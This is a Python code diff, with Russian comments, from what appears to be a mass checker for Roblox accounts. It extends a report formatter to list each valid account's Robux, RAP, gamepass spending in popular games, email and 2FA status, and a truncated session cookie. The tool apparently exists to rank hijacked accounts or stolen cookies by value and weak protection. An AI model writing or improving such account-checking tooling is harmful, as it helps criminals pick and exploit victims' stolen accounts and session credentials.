@@ -441,28 +441,59 @@ def format_full_report(info):
     return r
 
 def format_quick_report(result):
-    """БЫСТРЫЙ ОТЧЕТ (НЕ ИСПОЛЬЗУЕТСЯ В МАСС-ЧЕКЕРЕ)"""
     if result['status'] != '✅':
         return f"❌ НЕВАЛИД"
     
     info = result.get('full_info', {})
     if not info:
-        score = result.get('score', 0)
-        rank = "👑" if score >= 150 else ("💎" if score >= 100 else ("⭐" if score >= 60 else "🟢"))
-        rap_str = f"RAP: {result['rap']:,}" if result['rap'] is not None else "RAP: ❌"
-        play_str = f"{result['playtime']}h" if result['playtime'] is not None else "⏱️ ❌"
-        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} ({rap_str}) | {play_str} | S:{score}"
+        return f"❌ НЕТ ДАННЫХ ДЛЯ ОТЧЕТА"
     
     rap_str = f"⏣ {info.get('RAP', 0):,}" if info.get('RAP') else "RAP: ❌"
     play_str = f"{info.get('PlaytimeHours', 0)} ч." if info.get('PlaytimeHours') else "⏱️ ❌"
     
+    # Геймпассы
+    gp = info.get('PurchasedGamepasses', {})
+    TARGET_GAMES = ['Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals', 'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars', 'Tower Defense Simulator', 'Anime Adventures']
+    
+    gamepasses_text = ""
+    total_spent = 0
+    games_list = []
+    
+    for game_name, passes in gp.items():
+        for target in TARGET_GAMES:
+            if target.lower() in game_name.lower() or game_name.lower() in target.lower():
+                game_total = sum(p['price'] for p in passes)
+                total_spent += game_total
+                games_list.append({
+                    'name': game_name,
+                    'total': game_total,
+                    'count': len(passes),
+                    'passes': sorted(passes, key=lambda x: x['price'], reverse=True)[:3],
+                    'has_more': len(passes) > 3
+                })
+                break
+    
+    games_list.sort(key=lambda x: x['total'], reverse=True)
+    
+    if games_list:
+        gamepasses_text = f"\n💰 Потрачено на геймпассы: ⏣ {total_spent:,}"
+        for g in games_list[:5]:
+            gamepasses_text += f"\n  🎮 {g['name']}: {g['count']} гп, ⏣ {g['total']:,}"
+            for p in g['passes']:
+                gamepasses_text += f"\n     └─ {p['name']} — ⏣ {p['price']:,}"
+            if g.get('has_more'):
+                gamepasses_text += f"\n     └─ ... и ещё"
+    else:
+        gamepasses_text = "\n  ❌ Геймпассов в популярных играх не найдено"
+    
     r = f"👤 {info.get('Username', '?')} | 🆔 {info.get('UserID', '?')}\n"
     r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💎 {rap_str} | ⏱️ {play_str}\n"
     r += f"⭐ Premium: {'✅' if info.get('IsPremium') else '❌'} | 🔐 {info.get('SecurityStatus', '⚠️ НИЗКИЙ')}\n"
-    r += f"📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔑 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
+    r += f"📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔑 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}"
+    r += gamepasses_text
     r += f"\n🍪 {info.get('Cookie', '')[:50]}..."
+    
     return r
-
 # ==========================================
 # ФРЕШЕР
 # ==========================================
